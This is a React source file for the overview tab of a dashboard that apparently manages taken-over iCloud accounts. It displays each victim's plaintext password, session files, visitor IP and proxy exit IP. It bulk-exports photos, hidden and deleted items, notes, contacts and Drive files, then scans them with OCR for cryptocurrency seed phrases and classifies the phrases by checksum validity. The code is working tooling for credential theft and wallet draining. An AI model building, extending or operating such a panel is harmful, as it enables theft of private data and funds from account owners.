import { bytes, timeAgo } from "./api.js";
import { Badge, Bar, Section } from "./ui.jsx";

const COUNT_ROWS = [
  ["Photos", "photos"],
  ["Hidden", "hidden"],
  ["Recently Deleted", "deleted"],
  ["Albums", "albums"],
  ["Notes", "notes"],
  ["Contacts", "contacts"],
  ["Contacts with phone", "contactsPhone"],
  ["Contacts with email", "contactsEmail"],
  ["Drive files", "driveFiles"],
  ["Reminders", "reminders"],
  ["Calendars", "calendars"],
];

function AreaRow({ name, data, onMissing }) {
  const live = Number(data?.live) || 0;
  const exported = Number(data?.exported) || 0;
  const missing = Number(data?.missing) || 0;
  return (
    <div className="flex items-center justify-between gap-3 border-b border-[#f2f2f5] py-2 last:border-0">
      <span className="text-[13px] text-[#1d1d1f]">{name}</span>
      <span className="flex items-center gap-3 text-[12px] text-[#6e6e73]">
        <span>live {live.toLocaleString()}</span>
        <span>exported {exported.toLocaleString()}</span>
        {missing > 0 ? (
          <button
            type="button"
            onClick={onMissing}
            className="rounded-full bg-[#fff2f2] px-2 py-0.5 text-[11px] font-medium text-[#c4000a] hover:bg-[#ffe4e4]"
          >
            {missing.toLocaleString()} missing
          </button>
        ) : (
          <span className="rounded-full bg-[#edf8f0] px-2 py-0.5 text-[11px] text-[#1d7a3a]">complete</span>
        )}
      </span>
    </div>
  );
}

export default function OverviewTab({ account, summary, jobs, onExport }) {
  const identity = account.identity || {};
  const counts = account.counts || {};
  const storage = identity.storage || {};
  const used = Number(storage.used) || 0;
  const total = Number(storage.total) || 0;
  const progress = account.export || {};
  const percent = progress.total ? Math.round(((progress.done || 0) / progress.total) * 100) : 0;
  const verify = account.verify;
  const scan = account.scan;

  return (
    <div className="grid gap-4 xl:grid-cols-2">
      <Section title="Profile">
        <dl className="grid grid-cols-[110px_1fr] gap-y-2 text-[13px] leading-5">
          <dt className="text-[#6e6e73]">Name</dt>
          <dd>{identity.name || "—"}</dd>
          <dt className="text-[#6e6e73]">Phone</dt>
          <dd>{identity.phone || "—"}</dd>
          <dt className="text-[#6e6e73]">Plan</dt>
          <dd>{identity.plan?.featureKey || "—"}</dd>
          <dt className="text-[#6e6e73]">Storage</dt>
          <dd>
            <div className="flex items-center gap-2">
              <span>{bytes(used)} / {bytes(total)}</span>
              <Bar value={used} total={total} className="w-28" />
            </div>
          </dd>
          <dt className="text-[#6e6e73]">Trusted</dt>
          <dd>{account.trusted ? <Badge tone="green">trusted session</Badge> : <Badge tone="yellow">not trusted</Badge>}</dd>
          <dt className="text-[#6e6e73]">Last ping</dt>
          <dd>{timeAgo(account.lastPingAt)}</dd>
          <dt className="text-[#6e6e73]">Visitor</dt>
          <dd>{account.geo?.country || "—"} ({account.geo?.ip || "—"})</dd>
          <dt className="text-[#6e6e73]">Proxy</dt>
          <dd>
            {account.proxy?.country || "—"} · exit {account.proxy?.exitIp || "—"}
          </dd>
          <dt className="text-[#6e6e73]">Password</dt>
          <dd className="break-all font-mono text-[12px]">{account.password || "—"}</dd>
          <dt className="text-[#6e6e73]">Session</dt>
          <dd className="break-all font-mono text-[11px] text-[#6e6e73]">{account.sessionDir || "—"}</dd>
        </dl>
        {account.lastError ? (
          <p className="mt-3 rounded-[9px] bg-[#fff2f2] px-3 py-2 text-[12px] leading-4 text-[#c4000a]">
            {account.lastError}
            {account.locked ? (
              <a href={account.unlockUrl || "https://iforgot.apple.com"} target="_blank" rel="noopener" className="ml-1 underline">
                unlock
              </a>
            ) : null}
          </p>
        ) : null}
      </Section>

      <Section title="Counts">
        <dl className="grid grid-cols-2 gap-x-4 gap-y-1 text-[13px] sm:grid-cols-3">
          {COUNT_ROWS.map(([label, key]) => (
            <div key={key} className="flex flex-col rounded-[9px] bg-[#f5f5f7] px-3 py-2">
              <dt className="text-[10px] uppercase tracking-[0.04em] text-[#6e6e73]">{label}</dt>
              <dd className="text-[16px] font-semibold">{Number(counts[key]) || 0}</dd>
            </div>
          ))}
        </dl>
      </Section>

      <Section
        title="Export"
        right={<span className="text-[12px] text-[#6e6e73]">{progress.phase || "idle"}</span>}
      >
        <div className="flex items-center justify-between text-[12px] text-[#6e6e73]">
          <span>
            {progress.done || 0}/{progress.total || 0} items · {bytes(progress.bytes)}
          </span>
          <span>{percent}%</span>
        </div>
        <Bar value={progress.done} total={progress.total} className="mt-2" />
        {progress.areas ? (
          <div className="mt-3 grid grid-cols-2 gap-x-4 text-[11px] text-[#6e6e73]">
            {Object.entries(progress.areas).map(([area, value]) => (
              <div key={area} className="flex justify-between border-b border-[#f4f4f6] py-1">
                <span className="capitalize">{area}</span>
                <span>
                  {value.done || 0}/{value.total || 0}
                </span>
              </div>
            ))}
          </div>
        ) : null}
        <div className="mt-3 flex flex-wrap gap-2">
          <button
            type="button"
            onClick={() => onExport("missing")}
            className="h-8 rounded-[8px] bg-[#0071e3] px-3 text-[12px] font-medium text-white"
          >
            Export missing
          </button>
          <button
            type="button"
            onClick={() => onExport("force")}
            className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 text-[12px]"
          >
            Redownload all
          </button>
        </div>
      </Section>

      <Section
        title="Live iCloud check"
        right={
          verify?.finishedAt ? (
            <span className="text-[11px] text-[#6e6e73]">checked {timeAgo(verify.finishedAt)}</span>
          ) : null
        }
      >
        {verify?.areas ? (
          <div>
            {["photos", "hidden", "deleted", "notes", "drive", "contacts", "calendar", "reminders"].map(
              (area) =>
                verify.areas[area] ? (
                  <AreaRow
                    key={area}
                    name={area[0].toUpperCase() + area.slice(1)}
                    data={verify.areas[area]}
                    onMissing={() => onExport("missing")}
                  />
                ) : null
            )}
          </div>
        ) : (
          <p className="text-[13px] leading-5 text-[#6e6e73]">
            Run <b>Verify live</b> to list what iCloud holds versus what is on disk. Missing ids are
            downloadable without touching the good files.
          </p>
        )}
      </Section>

      <Section title="OCR + seed scan" className="xl:col-span-2">
        {scan?.finishedAt ? (
          <div className="flex flex-wrap items-center gap-x-6 gap-y-2 text-[13px]">
            <span>files <b>{scan.files || 0}</b></span>
            <span>images <b>{scan.images || 0}</b></span>
            <span>OCR ok <b>{scan.ocrOk || 0}</b></span>
            <span>failed <b>{scan.ocrFailed || 0}</b></span>
            <Badge tone="yellow">minimum {scan.tiers?.minimum || 0}</Badge>
            <Badge tone="blue">medium {scan.tiers?.medium || 0}</Badge>
            <Badge tone="red">high {scan.tiers?.high || 0}</Badge>
            <Badge tone="green">checksum valid {scan.tiers?.valid || 0}</Badge>
            <span className="text-[11px] text-[#6e6e73]">{timeAgo(scan.finishedAt)}</span>
          </div>
        ) : (
          <p className="text-[13px] leading-5 text-[#6e6e73]">
            Run <b>Scan OCR + seeds</b> to read text inside downloaded images and notes, index it for
            search, and classify BIP39 phrases by length and checksum.
          </p>
        )}
      </Section>

      <Section title="Recent jobs" className="xl:col-span-2">
        <ul className="space-y-1 font-mono text-[11px] leading-4 text-[#6e6e73]">
          {(jobs || []).slice(0, 8).map((job) => (
            <li key={job.id} className="flex flex-wrap gap-2">
              <span>{job.type}</span>
              <span className="text-[#1d1d1f]">{job.status}</span>
              <span>{new Date(job.createdAt).toLocaleString()}</span>
              {job.error ? <span className="text-[#c4000a]">{job.error}</span> : null}
            </li>
          ))}
          {!jobs?.length ? <li>No jobs yet.</li> : null}
        </ul>
      </Section>

    </div>
  );
}
